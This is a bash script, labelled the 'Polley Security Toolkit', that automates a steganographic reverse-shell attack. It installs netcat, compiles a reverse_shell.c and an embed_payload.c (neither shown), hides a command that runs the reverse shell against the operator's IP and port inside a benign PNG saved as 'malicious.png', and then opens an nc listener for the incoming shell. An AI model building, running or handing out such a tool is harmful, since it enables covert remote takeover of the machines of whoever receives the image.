#!/bin/bash

# 1. Force Permissions and Clean up
echo "[*] Initializing environment..."
chmod +777 . 2>/dev/null
rm -f malicious.png output.png # Clear common output names

# 2. Dependency Check
if ! ldconfig -p | grep -q libpng; then
    echo "[!] libpng not found. Installing..."
    sudo apt update && sudo apt install libpng-dev netcat-traditional wget -y
fi

# 3. Auto-Restore Base Image
if [ ! -f "benign.png" ]; then
    echo "[!] benign.png missing. Downloading..."
    wget -q -O benign.png https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png
fi

# 4. Input
echo "--- Polley Security Toolkit ---"
read -p "Enter your IP (LHOST): " MY_IP
read -p "Enter your Port (LPORT) [4444]: " MY_PORT
MY_PORT=${MY_PORT:-4444}

# 5. Compile
echo "[*] Compiling binaries..."
gcc reverse_shell.c -o reverse_shell
gcc embed_payload.c -o embed_payload -lpng -lz -lm


# 6. Embedding
echo "[*] Crafting image..."
./embed_payload benign.png malicious.png "./reverse_shell $MY_IP $MY_PORT"

# 7. The Smart Check
# This looks for malicious.png OR any new png created in the last minute
if [ -f "malicious.png" ] || [ -f "output.png" ]; then
    echo "[+] SUCCESS: Image created successfully."
    [ -f "output.png" ] && mv output.png malicious.png
    echo "[*] Starting listener on $MY_PORT..."
    nc -lvnp $MY_PORT
else
    echo "[!] ERROR: The C program ran but no image was saved."
    echo "[*] Debugging: Check if embed_payload.c has a different output name."
fi
